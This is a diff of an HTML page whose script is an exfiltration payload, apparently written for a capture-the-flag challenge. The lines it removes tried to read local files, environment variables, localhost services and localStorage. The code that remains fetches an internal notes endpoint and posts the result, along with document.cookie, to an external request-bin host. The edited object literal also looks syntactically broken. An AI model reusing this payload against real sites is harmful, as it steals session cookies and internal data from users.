@@ -1,32 +1,22 @@
 <html>
   <body>
     <script>
-      function downloadURI(uri, name) {
-      var link = document.createElement("a");
-      link.download = name;
-      link.href = uri;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-      delete link;}
-      
-      
-      var response = fetch('file:///challenge/metadata.json')
-      var envr = fetch('file:///proc/self/environ')
-      var local = fetch('http://localhost:4000')
-      var localp = fetch('http://localhost:4000', {method: "post"})
+//       var response = fetch('file:///challenge/metadata.json')
+//       var envr = fetch('file:///proc/self/environ')
+//       var local = fetch('http://localhost:4000')
+//       var localp = fetch('http://localhost:4000', {method: "post"})
       var noted = fetch('http://0.0.0.0:8080/notes')
       fetch("https://enmocb6j3fxoq.x.pipedream.net/", {
         method: "post",
         body: JSON.stringify({
-          store: Object.entries(localStorage),
-          username: localStorage.getItem('username'),
-          image: localStorage.getItem('image'),
-          metadata: JSON.stringify(response),
-          env: JSON.stringify(envr),
-          local: JSON.stringify(local),
-          localp: JSON.stringify(localp),
-          noted: noted
+//           store: Object.entries(localStorage),
+//           username: localStorage.getItem('username'),
+//           image: localStorage.getItem('image'),
+//           metadata: JSON.stringify(response),
+//           env: JSON.stringify(envr),
+//           local: JSON.stringify(local),
+//           localp: JSON.stringify(localp),
+          noted: JSON.stringify(noted)
           cookie: document.cookie,
         }),
       });
